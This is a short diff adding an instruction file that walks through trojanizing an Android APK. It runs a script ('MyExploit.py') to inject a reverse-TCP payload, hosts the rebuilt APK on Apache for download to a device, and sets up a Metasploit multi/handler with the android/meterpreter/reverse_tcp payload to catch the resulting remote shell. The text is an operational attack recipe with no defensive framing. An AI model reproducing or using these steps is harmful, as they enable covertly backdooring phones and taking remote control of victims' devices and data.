@@ -1,0 +1,26 @@
+//copy the original apk to this folder
+
+//Open Terminal Window. Type the following
+python MyExploit.py "original apk name" tcp "ipaddress" "port" yes AssistActivity
+
+//Enter Passphrase for keystore: password
+
+//go to the original apk folder created 
+//find the new apk in the /dist folder
+
+//copy the file to the /root/var/www/html directory
+
+service apache2 start
+
+/*Download app to the device and install*/
+
+msfconsole
+use exploit/multi/handler 
+
+set payload android/meterpreter/reverse_tcp
+set LHOST "ipaddress"
+set LPORT "port"
+
+exploit
+
+//Done
